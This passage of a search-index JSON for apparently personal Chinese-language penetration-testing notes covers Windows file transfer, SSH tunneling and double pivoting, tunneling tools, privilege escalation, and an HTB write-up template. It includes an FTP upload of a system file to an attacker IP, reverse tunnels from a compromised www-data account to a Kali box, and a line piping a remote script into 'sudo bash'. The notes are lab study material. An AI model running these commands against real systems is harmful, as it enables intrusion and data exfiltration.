-s:ftpcommand.txt\nftp&gt; open 192.168.49.128\n\nLog in with USER and PASS first.\n\n\nftp&gt; USER anonymous\nftp&gt; PUT c:\\windows\\system32\\drivers\\etc\\hosts\nftp&gt; bye\n</code></pre> - \u4e0a\u4f20\u65f6\u7528<code>PUT</code></p>","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#misc","title":"Misc","text":"","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#winrm","title":"WinRM","text":"","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#lol","title":"LOL","text":"<p>To search for download and upload functions in\u00a0LOLBAS\u00a0we can use\u00a0<code>/download</code>\u00a0or\u00a0<code>/upload</code>.</p>","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/Persistence/","title":"\u6743\u9650\u7ef4\u6301","text":"<p>Waiting...</p>"},{"location":"post-exploitation/SSH%20Tunneling/","title":"SSH Tunneling","text":"","tags":["\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/SSH%20Tunneling/#ssh","title":"SSH\u539f\u7406\u6982\u8ff0","text":"<p>https://www.ramkitech.com/2012/04/how-to-do-ssh-tunneling-port-forwarding.html \u5728terminal\u4e2d\uff0c\u5f53\u6211\u4eec\u6572\u5165ssh someone@private-server.org\u65f6\uff0cterminal application\u5c06\u8c03\u7528ssh client\uff0cssh client\u5219\u8fde\u63a5\u5230private-server.org\u673a\u5668\u768422\u7aef\u53e3(\u7531ssh server\u76d1\u542c).\u7136\u540eclient\u548cserver\u4ea4\u6362Identitiy,public key, cipher suite info\u5e76\u4e14\u5728server\u7aef\u521b\u5efa\u4e00\u4e2a\u65b0\u7684shell process.\u968f\u540eclient\u548cserver\u4e4b\u95f4\u5c31\u5efa\u7acb\u4e86\u5b89\u5168\u7684\u901a\u9053\u4e86,\u8fd9\u6837\u4e4b\u540e\u7684\u6240\u6709command\u53caresponse\u90fd\u901a\u8fc7\u8fd9\u4e2asecure channel\u6765\u4f20\u9012\u3002 \u6bd4\u5982\u5f53ssh\u8fde\u63a5\u5efa\u7acb\u540e\uff0c\u6211\u6267\u884cls\u547d\u4ee4\u3002\u90a3\u4e48ls\u547d\u4ee4\u5c06\u7531ssh client\u52a0\u5bc6\u5c01\u88c5\u901a\u8fc7\u8be5\u901a\u9053\u53d1\u5f80server\u3002server\u5219\u89e3\u5bc6\u53d6\u51fa\u547d\u4ee4'ls'\u5e76\u4e14\u5728shell(\u8be5shell\u5c31\u662fssh\u94fe\u63a5\u521b\u5efa\u65f6\u6240\u521b\u5efa\u7684)\u4e2d\u6267\u884c,\u6240\u6709\u7684\u8f93\u51fa\u5c06\u88abredirect\u5230\u8be5\u96a7\u9053\u7684\u53e6\u4e00\u7aef-ssh client\u4e0a,\u6700\u540essh client\u5219\u89e3\u5bc6\u53d6\u51faoutput\u6d88\u606f\u6253\u5370\u5728terminal application\u4e0a\u3002</p> <ul> <li>ssh \u53ef\u4ee5\u540c\u65f6\u6709\u8bb8\u591achannels\uff08Shell\u3001Data\u3001X11 Forwarding\u7b49\uff09\uff0c\u6bcf\u4e2achannel\u4ee3\u8868\u4e00\u4e2a\u670d\u52a1\u3002</li> <li>\u901a\u5e38\u60c5\u51b5\u4e0b\u6211\u4eec\u5c31\u662f\u4f7f\u7528\u7684 shell channel\uff08\u53ef\u4ee5\u7528 <code>-N</code> \u5ffd\u7565\u521b\u5efa\uff09\uff0c\u4f46ssh\u96a7\u9053\u6a21\u5f0f\u4e0b\u6211\u4eec\u7528\u7684 data channel\u3002</li> </ul>","tags":["\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/SSH%20Tunneling/#3","title":"3\u79cd\u7c7b\u578b","text":"","tags":["\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/SSH%20Tunneling/#_1","title":"\u547d\u4ee4\u603b\u7ed3","text":"<p><code>ssh -L/R [bind_address:]sourcePort:forwardToHost:onPort remoteHost</code></p> <ul> <li>L/R\u6307\u793a <code>sourcePort</code> \u662f\u5728localhost\u7aef\uff08\u6267\u884c\u547d\u4ee4\u7684host\uff09\u8fd8\u662fremoteHost<ul> <li>\u6ce8\u610f\uff1a<code>sourcePort</code> \u662f\u6307L/R\uff08\u672c\u5730/\u8fdc\u7aef\uff09\u8981\u5f00\u542f\u76d1\u542c\u7684\u7aef\u53e3\u3002\u4f8b\u5982-R\u7684\u8bdd\u662f\u6307\u5728\u8fdc\u7aef\u5f00\u542f\uff0c\u672c\u5730\u662f\u4e0d\u4f1a\u5f00\u542f\u7aef\u53e3\u76d1\u542c\u7684\u3002</li> </ul> </li> <li><code>forwardToHost:onPort</code> \u4e0d\u5fc5\u5c40\u9650\u57282\u53f0\u673a\u5668\u4e4b\u95f4\uff08\u53c2\u8003\uff09</li> <li>\u6ce8\u610f\u53ef\u4ee5\u5b9a\u4e49\u591a\u4e2a -L/R</li> </ul>","tags":["\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/SSH%20Tunneling/#opsec","title":"OPSEC","text":"<pre><code>ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o \"UserKnownHostsFile=/dev/null\" -o \"StrictHostKeyChecking=no\" -i /tmp/keys/id_rsa kali@10.11.0.4\n</code></pre> <ul> <li>\u5728Ajla\u4e0a\u7528www-data\u7528\u6237\u6267\u884c\u8fdc\u7a0b\u7aef\u53e3\u8f6c\u53d1</li> <li>\u9632\u6b62\u5728\u76ee\u6807\u673a\u5668\u4e0a\u4fdd\u5b58\u6211\u4eeckali\u7684\u4e3b\u673a\u516c\u94a5</li> <li>\u4e3awww-data\u7528\u6237\u751f\u6210ssh\u5bc6\u94a5\uff0c\u5e76\u52a0\u4e00\u4e9b\u9650\u5236\uff08srcIP\u3001\u4ec5\u7aef\u53e3\u8f6c\u53d1\u3001\u4e0d\u5206\u914d\u4f2a\u7ec8\u7aef\uff09\uff0c\u5c06\u516c\u94a5\u52a0\u5165kali\u7684 <code>authorized_keys</code> \u6587\u4ef6\uff1a<code>from=\"10.11.1.250\",command=\"echo 'This account can only be used for port forwarding'\",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa ssh-rsa AAAAB3Nz&lt;SNIP&gt;nin www-data@ajla</code></li> </ul>","tags":["\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/SSH%20Tunneling/#_2","title":"\u6709\u7528\u9009\u9879","text":"<p>-fNTCg</p> <ul> <li>-f\uff1a\u540e\u53f0\u8fdb\u7a0b\uff0c\u4e0d\u5360\u7528\u5f53\u524dshell\uff0c\u53ea\u6709\u8ba4\u8bc1\u65f6\u4f1a\u5230\u524d\u53f0\u3002\uff08\u4f3c\u4e4e\u5373\u4f7fMeterpreter\u8fdb\u7a0b\u6b7b\u4e86\uff0cssh\u96a7\u9053\u4f9d\u65e7\u751f\u6548\uff09</li> <li>-N\uff1a\u9759\u9ed8\u8fde\u63a5\uff08\u53ea\u5f53\u4f5c\u96a7\u9053\u3002\u5373\u4e0d\u521b\u5efashell channel\uff0c\u4e0d\u767b\u5f55\u5230\u8fdc\u7a0bshell\u3001\u4e0d\u53d1\u51fassh\u547d\u4ee4\uff09</li> <li>-T\uff1a\u8fdc\u7a0b\u4e3b\u673a\u4e0a\u4e0d\u5206\u914d\u4f2a\u7ec8\u7aef\u3002\u901a\u5e38\u548cN\u8fde\u7528\uff0c\u4e0d\u8fc7\u5206\u914d\u4e86\u4e5f\u6ca1\u4e8b\uff0c\u53ea\u662f\u6709\u70b9\u6ca1\u5fc5\u8981\u3002\uff08\u6269\u5c55\uff1a\u672c\u673a\u8fde\u63a5\u8fdc\u7a0b\u8fdc\u7a0b\u4e3b\u673a\u7684\u4ea4\u4e92\u5b9e\u9645\u4e0a\u662f\u5728\u4e0e\u8fdc\u7a0b\u4e3b\u673a\u7684\u4f2a\u7ec8\u7aef\u4ea4\u4e92\uff09</li> <li>-C\uff1a\u538b\u7f29\u3002\u51cf\u5c11\u5e26\u5bbd\uff0c\u4f46\u662f\u53ef\u80fd\u589e\u52a0CPU\u8d1f\u8377\uff08\u56e0\u4e3a\u8981\u52a0\u89e3\u538b\u7f29\uff09</li> <li>-g\uff1aGatewayPorts \u5173\u952e\u5b57\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6307\u5b9a\u5b83\u4f7f\u5f97\u5176\u4ed6\u673a\u5668\u4e5f\u80fd\u4f7f\u7528\u8fd9\u4e2a\u672c\u5730\u7aef\u53e3\u8f6c\u53d1\u3002\u5141\u8bb8\u8fdc\u7aefhost\u8fde\u63a5\u672c\u5730\u7528\u4e8e\u8f6c\u53d1\u7684\u7aef\u53e3\u3002\u672c\u5730\u7aef\u53e3\u8f6c\u53d1\u7ed1\u5b9a\u7684\u662f lookback \u63a5\u53e3\uff08\u5373\u4e0a\u9762 <code>bind_address</code> \u7684\u90e8\u5206\uff0c\u4e0d\u5f00\u542fGatewayPorts\u914d\u7f6e\u7684\u8bdd\uff0c\u8fd9\u91cc\u9ed8\u8ba4localhost\uff09\uff0c\u8fd9\u610f\u5473\u7740\u53ea\u6709 localhost \u6216\u8005 127.0.0.1 \u624d\u80fd\u4f7f\u7528\u672c\u673a\u7684\u7aef\u53e3\u8f6c\u53d1 , \u5176\u4ed6\u673a\u5668\u53d1\u8d77\u7684\u8fde\u63a5\u53ea\u4f1a\u5f97\u5230\u201c connection refused. \u201d\u3002\u3010\u5982\u679c\u4e0d\u52a0\u8fd9\u4e2a\u53c2\u6570\uff0c\u53ea\u5141\u8bb8\u672c\u5730\u4e3b\u673a\u4f7f\u7528\u8fd9\u4e2a\u7aef\u53e3\u8f6c\u53d1\u3002\u66f4\u5b89\u5168\u3011</li> </ul>","tags":["\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/SSH%20Tunneling/#1","title":"1.\u52a8\u6001\u7aef\u53e3\u8f6c\u53d1","text":"<ul> <li>\u52a8\u6001\uff1a\u4e0d\u5fc5\u4e3a\u6bcf\u4e2a\u76ee\u6807\u521b\u5efa\u672c\u5730\u76d1\u542c\u7aef\u53e3\uff0c\u4e00\u4e2a\u52a8\u6001\u7aef\u53e3\u5e94\u4ed8\u6240\u6709\u76ee\u6807\u2014\u2014\u6bd4\u672c\u5730\u7aef\u53e3\u8f6c\u53d1\u7b80\u7ea6\u3002<ul> <li>\u670d\u52a1\u5668\u68c0\u67e5\u6570\u636e\u5305\u5e76\u51b3\u5b9a\u6211\u4eec\u9700\u8981\u5c06\u6570\u636e\u5305\u53d1\u9001\u5230\u54ea\u91cc</li> </ul> </li> </ul> <p><pre><code>ssh -D 9050 ubuntu@10.129.15.50\n</code></pre> </p> <p>\u5c31\u662f\u5728SSH Client\u524d\u8bbe\u7f6e\u4e2a\uff08SOCKS\uff09\u4ee3\u7406server\uff0c\u5e76\u7ed1\u5b9alocal port 9050\u3002\u968f\u540e\u7528\u767b\u9646ubuntu\u5e76\u5efa\u7acbssh connection\u3002</p> <p>\u4e4b\u540e\u5728\u6d4f\u89c8\u5668\u914d\u7f6eSOCKSv5\u4ee3\u7406\u5c31\u53ef\u4ee5\u7528\u6d4f\u89c8\u5668\u8bbf\u95eeubuntu\u751a\u81f3\u662f\u5185\u7f51\uff08\u56e0\u4e3a\u547d\u4ee4\u5728ubuntu\u89e3\u6790\uff0cubuntu\u6709\u5185\u7f51\u8def\u7531\uff09\u7684\u8d44\u6e90\u4e86\u3002</p>","tags":["\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/SSH%20Tunneling/#proxychains","title":"proxychains","text":"<p>[!note] \u73b0\u5728\u7528proxychains-ng</p> <p>\u914d\u7f6e\u4ee3\u7406IP\uff1a<code>sudo vim /etc/proxychains4.conf</code> \u4f7f\u7528proxychains\uff1a<code>proxychains4 remmina</code></p> <p>\u4e5f\u53ef\u4ee5\u5728 <code>~/.ssh/ssh_config</code> \u91cc\u6dfb\u52a0\u914d\u7f6e\u65b9\u4fbf\u64cd\u4f5c\uff1a <pre><code>Host dest   \n    Hostname 192.168.56.10   \n    Port 22   \n    User ubuntu   \n    IdentityFile ~/.ssh/id_rsa\n    DynamicForward localhost:5963\n</code></pre></p> <p>\u8fd0\u884c <code>ssh dest</code> \u4e4b\u540e\uff0cssh\u4f1a\u5728\u672c\u5730\u7ed1\u5b9a\u4e00\u4e2a\u652f\u6301SOCKS\u534f\u8bae\u7684\u7aef\u53e3\uff08\u6b64\u5904\u4e3a5963\uff09\u3002</p>","tags":["\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/SSH%20Tunneling/#2","title":"2.\u672c\u5730\u7aef\u53e3\u8f6c\u53d1","text":"<p><pre><code>ssh -L 1234:localhost:3306 ubuntu@10.129.202.64\n</code></pre> </p> <p>\u76f8\u5f53\u4e8e\u672c\u5730ssh client\u5145\u5f53\u4ee3\u7406\u3002Attack\u7684ssh client\u7684\u76d1\u542c\u7ed1\u5b9a\u4e861234\u7aef\u53e3\uff0c\u6240\u4ee5\u6240\u6709\u52301234\u7684\u6d41\u91cf\u90fd\u4f1a\u8f6c\u53d1\u5230ssh client\uff0c\u7136\u540e\u6d41\u5411\u8fdc\u7aef\u3002</p> <p>\u8fdb\u884c\u8fde\u63a5\u7684\u547d\u4ee4\u5176\u5b9e\u4f1a\u6839\u636eremote port\u7684\u670d\u52a1\u8fdb\u884c\u9009\u62e9\u3002\u5982\u53ef\u4ee5\u8fd9\u6837\uff1a</p> <ul> <li>\u8f6c\u53d1ftp\u7aef\u53e3\uff1a<code>ftp localhost:localport</code></li> <li>\u8f6c\u53d1rdp\u7aef\u53e3\uff1a<code>rdesktop localhost:localport</code></li> </ul>","tags":["\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/SSH%20Tunneling/#3_1","title":"3.\u8fdc\u7a0b\u7aef\u53e3\u8f6c\u53d1","text":"<p><pre><code>ssh -R &lt;PivotHost&gt;:8080:0.0.0.0:8000 ubuntu@&lt;Target&gt; -vN\n</code></pre> </p> <p>\u4e0a\u56fe\u7684\u4f8b\u5b50\u4e2d\uff0cVictim\u6267\u884c\u7684msfvenom payload\u662f\u56de\u8fde <code>Ubuntu\u76848080</code>\uff0chandler\u76d1\u542c <code>0.0.0.0:8000</code>\u3002 \u53cd\u5f39shell\u56de\u8fdeUbuntu\u540e\u901a\u8fc7SSH\u96a7\u9053\u8f6c\u53d1\u5230\u672c\u57308000\u7aef\u53e3\uff0c\u5f97\u4ee5\u6210\u529f\u8fdc\u63a7\u3002</p>","tags":["\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/SSH%20Tunneling/#ssh-reverse-dynamic-forward","title":"SSH Reverse Dynamic Forward","text":"","tags":["\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/SSH%20Tunneling/#for-windows","title":"For Windows","text":"","tags":["\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/SSH%20Tunneling/#ssh_1","title":"\u5efa\u7acbssh\u670d\u52a1\u7aef","text":"<ul> <li>WinSSHD\uff1a https://www.bitvise.com/ssh-server</li> <li>OpenSSH\uff1a https://sshwindows.sourceforge.net/</li> </ul> <p>\u5173\u4e8eProxifier\uff1a https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6</p> <p>[!note] \u6216\u8005\u5728cmd\u4f7f\u7528\u8fdc\u7a0b\u52a8\u6001\u8f6c\u53d1\uff01</p>","tags":["\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/SSH%20Tunneling/#_3","title":"\u9ad8\u7ea7\u8fd0\u7528","text":"","tags":["\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/SSH%20Tunneling/#double-pivoting","title":"Double Pivoting","text":"<p>https://theyhack.me/Proxychains-Double-Pivoting/</p> <p></p> <p>\u76ee\u6807\uff1a\u4eceattack\u8bbf\u95eedestbox\u3002 \u53ef\u4ee5\u60f3\u8c61box1\u4e3aWebSrv\uff0cbox2\u4e3aFileSrv\uff0cdestbox\u4e3aDC/\u7279\u6743PC\u3002 \u5047\u8bbebox1\u8fde\u63a5box2\u3001box2\u8fde\u63a5destbox\u53ef\u4ee5\u7b80\u5355\u5b9e\u73b0\uff08\u56e0\u4e3a\u90fd\u5c5e\u4e8e\u5185\u7f51\uff09\u3002 \u4e8e\u662fattack\u65e0\u6cd5\u6b63\u5411\u8fde\u63a5box1\u662f\u901a\u5e38\u7684\u60c5\u51b5\uff0c\u6240\u4ee5\u9700\u8981box1\u53cd\u8fdeattack\u3002</p>","tags":["\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/SSH%20Tunneling/#reverse-tunneling","title":"reverse tunneling","text":"<pre><code># 1. attack:2222 ==== jumpbox1:22\nthey@jumpbox1.local:~$ ssh -fN -R 2222:127.0.0.1:22 &lt;you&gt;@attack.local\n# 2. attack\u4e0a\u7684\u52a8\u6001\u7aef\u53e38888\uff0c\u8fde\u63a5\u5230jumpbox1\nthey@attack.local:~$ ssh -fN -D 8888 &lt;jumpbox1-user&gt;@127.0.0.1 -p 2222\n## 1&amp;2 in oneline\nthey@jumpbox1.local:~$ ssh -f -R 2222:127.0.0.1:22 attack.local \"ssh -fN -D 8888 127.0.0.1 -p 2222\"\n\n# \u8fde\u63a5\u5230box1\u4e4b\u540e\u91cd\u590d\u6267\u884c\u52a8\u6001\u96a7\u9053\u7684\u6b65\u9aa4\u2014\u2014\u5373\u524d\u6587\u5047\u8bbe\u53ef\u7b80\u5355\u5b9e\u73b0\u7684\u5185\u5bb9\nthey@jumpbox1.local:~$ ssh -fN -D 9999 user@jumpbox2.local\n\n# \u653b\u51fb\u673a\u7684proxychains.conf\u914d\u7f6e\n&lt;SNIP&gt;\n[ProxyList]\nsocks4  127.0.0.1 8888\nsocks4  127.0.0.1 9999 # For box1 to box2\n\n# \u8bbf\u95eedestbox\nthey@attack.local:~$ proxychains4 -f proxychains.conf curl http://destbox.local\n</code></pre> <ul> <li>\u5efa\u8bae\u914d\u7f6e <code>jumpbox1-user</code> \u7684\u6709\u9650\u5236\u514d\u5bc6\u8fde\u63a5\uff1arestrict accordingly to just tunnels</li> </ul>","tags":["\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/SSH%20Tunneling/#_4","title":"\u5185\u7f51\u96a7\u9053\u7684\u53e6\u4e00\u5b9e\u73b0\u601d\u8def","text":"<p>https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6</p> <p>\u6309\u8be5\u6587\u601d\u8def\uff0c\u9488\u5bf9\u524d\u4e00\u8282\u7684\u201c\u5047\u8bbebox1\u8fde\u63a5box2\u3001box2\u8fde\u63a5destbox\u53ef\u4ee5\u7b80\u5355\u5b9e\u73b0\u201d\u7684\u547d\u4ee4\uff1a <pre><code># 1. box2\u4e0a\u5efa\u7acb\u52a8\u6001\u96a7\u9053\uff0c\u4f46\u662fSSH\u670d\u52a1\u7aef\u5728box2\u7684loopback\nthey@jumpbox2.local:~$ ssh -D 10000 &lt;jumpbox1-user&gt;@127.0.0.1\n# 2. box1:9999 ==== box2:10000\nthey@jumpbox2.local:~$ ssh -R 9999:127.0.0.1:10000 &lt;jumpbox1-user&gt;@jumpbox1.local\n\n# \u5728\u653b\u51fb\u673a\u4e0a\n# \u6b63\u5411\u8fde\u63a5box1\uff1a\u914d\u7f6e127.0.0.1:8888\uff0c\u7136\u540e\u7528proxychains\u5373\u53ef\u3002\n# \u4ecebox1\u53cd\u5411\u96a7\u9053\uff1a\u53c2\u7167\u524d\u4e00\u8282\u3002\n</code></pre></p>","tags":["\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/tunneling/","title":"Tunneling","text":"","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/tunneling/#ssh","title":"SSH","text":"<p>SSH Tunneling</p>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/tunneling/#https","title":"HTTP/S","text":"","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/tunneling/#tools","title":"tools","text":"<ul> <li>reGeorg\uff08\u811a\u672c\u7279\u5f81\u8f83\u660e\u663e\uff09</li> <li>ProxyChains</li> <li>HTTPort\uff08www.targeted.org\uff09</li> <li>SuperNetworkTunnel\uff08networktunnel.net\uff09</li> <li>HTTP-Tunnel\uff08www.http-tunnel.com\uff09</li> </ul>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/tunneling/#dns","title":"DNS","text":"<p>\u80cc\u666f\uff1a\u4f20\u7edfSocket\u96a7\u9053\u6fd2\u4e34\u6dd8\u6c70\uff0cTCP/UDP\u88ab\u9632\u5fa1\u7cfb\u7edf\u62e6\u622a\u3002\u6240\u4ee5DNS\u3001ICMP\u3001HTTP/S\u7b49\u96be\u4ee5\u88ab\u7981\u7528\u7684\u534f\u8bae\u6210\u4e3b\u6d41\u3002</p>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/tunneling/#tools_1","title":"tools","text":"<ul> <li>dnscat2</li> <li>Iodine</li> <li>DNSTunnel\uff08dnstunnel.de\uff09</li> <li>Netcross</li> </ul>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/tunneling/#socks","title":"SOCKS","text":"<ul> <li>ProxyChains</li> <li>EarthWorm</li> </ul>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/tunneling/#icmp","title":"ICMP","text":"<ul> <li>ptunnel-ng</li> </ul>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"privilege-escalation/privilege-escalation/","title":"\u7b80\u4ecb","text":""},{"location":"privilege-escalation/privilege-escalation/#_1","title":"\u63d0\u6743\u7684\u7c7b\u578b","text":"<ul> <li>\u6c34\u5e73\uff1a\u6a2a\u5411\u79fb\u52a8</li> <li>\u5782\u76f4\uff1a\u83b7\u53d6\u66f4\u9ad8\u6743\u9650</li> </ul>"},{"location":"privilege-escalation/privilege-escalation/#_2","title":"\u65b9\u6cd5","text":""},{"location":"privilege-escalation/privilege-escalation/#_3","title":"\u6f0f\u6d1e","text":"<ul> <li>CVSS\u7684AV\u5206\u7c7b\uff08\u7f51\u7edc/\u672c\u5730\uff09\uff0c\u4e00\u822c\u7f51\u7edc\u7684\u5206\u6570\u8f83\u9ad8\u3002</li> </ul>"},{"location":"privilege-escalation/privilege-escalation/#_4","title":"\u547d\u540d\u7ba1\u9053","text":""},{"location":"privilege-escalation/privilege-escalation/#dll","title":"DLL\u52ab\u6301","text":"<p>\u53ef\u5229\u7528\u539f\u56e0\uff1a\u5927\u90e8\u5206Windows\u5e94\u7528\u7a0b\u5e8f\u8c03\u7528\u5916\u90e8DLL\u65f6\uff0c\u90fd\u4e0d\u4f1a\u4f7f\u7528\u7edd\u5bf9\u8def\u5f84\u3002</p> <p>\u5de5\u5177\uff1a\u641c\u7d22\u53ef\u52ab\u6301\u7684DLL</p> <ul> <li>Robber</li> <li>PowerSploit</li> </ul> <p>\u4e00\u822c\u6743\u9650\u7f16\u8f91DLL\u6587\u4ef6\uff0c\u7b49\u5f85admin\u6743\u9650\u8c03\u7528\u76ee\u6807DLL\u4e5f\u53ef\u3002</p>"},{"location":"privilege-escalation/privilege-escalation/#dylibos-x","title":"Dylib\u52ab\u6301\uff08OS X\uff09","text":"<p>\u5de5\u5177\uff1aDylib Hijack Scanner</p>"},{"location":"privilege-escalation/waiting/","title":"Linux","text":"<p>Waiting...</p>"},{"location":"writeup/active/writeup-template/","title":"Write Up \u6a21\u677f","text":"<p>\uff08\u6a21\u677f\u66f4\u65b0\uff1a2024/08/16\uff09</p> <ul> <li>\u57fa\u672c\u4e0aHTB\u7684\u673a\u5668\uff08\u53ef\u80fd\u53ea\u662fEsay\u673a\u5668\uff09\u90fd\u4f1a\u4f7f\u7528\u8fd9\u4e2aWP\u6a21\u677f\u3002</li> <li>\u53ef\u80fd\u6211\u5bf9WP\u8fd9\u4e2a\u8bcd\u7684\u7406\u89e3\u6709\u504f\u5dee\uff0c\u66f4\u5e94\u8be5\u8bf4\u662f\u6211\u81ea\u5df1\u7684\u6253\u9776\u3001\u5b66\u4e60\u7b14\u8bb0\uff0c\u6240\u4ee5\u4f1a\u8bb0\u5f55\u8bb8\u591a\u8e29\u5751\u4e0e\u601d\u8def\u7b49\u5e9f\u8bdd\u3002</li> <li>MetaTwo\u4e4b\u524dWP\u6a21\u677f\u5e76\u672a\u6210\u5f62\uff0c\u6240\u4ee5\u8bed\u8a00\u3001\u683c\u5f0f\u4e0a\u4f1a\u7565\u6709\u4e0d\u540c\u3002\u4ee5\u540e\u53ef\u80fd\u4e5f\u4f1a\u4e0d\u65ad\u6539\u5584\u8fd9\u4e2a\u6a21\u677f\u7684\u4e0d\u8db3\u4e4b\u5904\u3002</li> <li>\u5bf9\u4e8e\u4ecd\u5728Active\u7684\u673a\u5668\uff0c\u5982\u679c\u53d1\u5e03\u7684\u8bdd\uff0c\u90fd\u4f1a\u5728WP\u5f00\u5934\u5199\u4e0a Waiting for machine retire...\uff0c\u8868\u793a\u8fd9\u8fb9\u6682\u65f6\u4e0d\u4f1a\u7ed9\u51fa\u8be6\u7ec6WP\u3002\u4e0d\u8fc7\u4f1a\u5217\u4e00\u4e9b\u63d0\u793a\u3002\u7b49\u673a\u5668\u9000\u5f79\u540e\uff0c\u4f1a\u66f4\u65b0\u51fa\u8be6\u7ec6WP\u3002</li> </ul>","tags":["HTB/Easy","HTB/Linux","HTB/Medium","HTB/Windows"]},{"location":"writeup/active/writeup-template/#wp","title":"\uff08\u4e2a\u4eba\u6574\u7406\u7528\uff09\u5173\u4e8eWP\u7684\u56fe\u7247\u5904\u7406\u6b65\u9aa4","text":"<ol> <li>\u5148\u76f4\u63a5\u7c98\u8d34\u56fe\u7247</li> <li>\u5728WP\u4e2d\u53f3\u952e\u4fbf\u6377\u66f4\u6539\u56fe\u7247\u540d\u79f0\uff08WP\u4ee5\u5916\u7684\u60c5\u51b5\u53ef\u4ee5\u76f4\u63a5\u79fb\u52a8\u56fe\u7247\u5230<code>static/img/ATTACHMENTS/</code>\uff0c<code>{ width='500' }</code>\u8c03\u6574\u5927\u5c0f\u4e5f\u6709\u6548\uff09</li> <li>\u5c06\u56fe\u7247\u79fb\u52a8\u5230<code>evidence-img/</code></li> <li>Obsidian\u4f3c\u4e4e\u4f1a\u81ea\u52a8\u94fe\u63a5\uff0c\u4f46\u662f\u8981\u6ce8\u610f\u5c06WP\u79fb\u52a8\u5230mkdocs\u540e\u94fe\u63a5\u9700\u8981\u52a0\u4e0a<code>./../evidence-img/</code>\u524d\u7f00\u3002</li> </ol>","tags":["HTB/Easy","HTB/Linux","HTB/Medium","HTB/Windows"]},{"location":"writeup/active/writeup-template/#wp_1","title":"\u4e0b\u9762\u662fWP\u6a21\u677f\uff1a\uff1a","text":"","tags":["HTB/Easy","HTB/Linux","HTB/Medium","HTB/Windows"]},{"location":"writeup/active/writeup-template/#summary","title":"Summary","text":"<p>...</p>","tags":["HTB/Easy","HTB/Linux","HTB/Medium","HTB/Windows"]},{"location":"writeup/active/writeup-template/#relevant-skills","title":"Relevant Skills","text":"<ul> <li>nmap</li> <li>\u5b50\u57df\u679a\u4e3e</li> <li>sudo\u63d0\u6743</li> <li>\u2026\u2026</li> </ul>","tags":["HTB/Easy","HTB/Linux","HTB/Medium","HTB/Windows"]},{"location":"writeup/active/writeup-template/#attack-path-overview","title":"Attack Path Overview","text":"","tags":["HTB/Easy","HTB/Linux","HTB/Medium","HTB/Windows"]},{"location":"writeup/active/writeup-template/#external-recon-nmap","title":"External Recon - nmap","text":"<p>\u81ea\u7528\u626b\u63cf\u811a\u672c\uff1a\u5de5\u4f5c\u6d41 <code>curl -s https://raw.githubusercontent.com/TimeLess613/workflow-scan4HTB/main/workflow-scan4HTB.sh | sudo bash -s &lt;HTB-MachineName&gt; &lt;HTB_IP&gt;</code></p> <p>\u5f00\u653e\u7aef\u53e3\uff1a <pre><code>PORT      STATE SERVICE VERSION\n22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n55555/tcp open  